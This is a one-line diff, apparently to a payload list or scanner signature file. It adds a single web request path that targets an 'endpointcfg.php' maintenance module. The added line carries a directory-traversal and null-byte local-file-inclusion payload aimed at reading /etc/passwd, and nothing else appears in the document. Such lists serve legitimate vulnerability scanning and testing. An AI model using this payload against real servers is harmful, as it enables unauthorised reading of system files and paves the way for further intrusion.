@@ -1,0 +1,1 @@
+/maint/modules/endpointcfg/endpointcfg.php?lang=../../../../../../../../etc/passwd%00
